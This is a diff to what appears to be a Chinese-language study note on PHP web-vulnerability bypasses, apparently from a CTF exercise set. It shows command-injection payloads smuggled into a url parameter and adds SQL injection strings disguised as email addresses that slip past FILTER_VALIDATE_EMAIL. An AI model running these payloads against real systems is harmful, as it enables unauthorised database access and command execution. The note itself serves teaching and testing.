@@ -61,7 +61,15 @@ payload
 ?url=demo://%22;ls;%23;sec-redclub.com:80/
 ?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/
 ```
-
+^
+同理
+```
+从POST中获取请求体参数
+$email = filter_input(INPUT_POST, 'email',FILTER_VALIDATE_EMAIL);
+filter_input()用于从外部变量（如$_GET、$_POST、$_COOKIE、$_SERVER、$_ENV、$_REQUEST）中获取输入，并应用过滤器对输入进行处理。
+可能被模仿邮箱地址绕过sql注入:'union/**/select/**/username/**/from/**/user#@qq.com
+123@qq.com' UNION SELECT * FROM admin WHERE 1=1 #
+```
 
 ^
 #### **6、class_exists()任意文件读取**
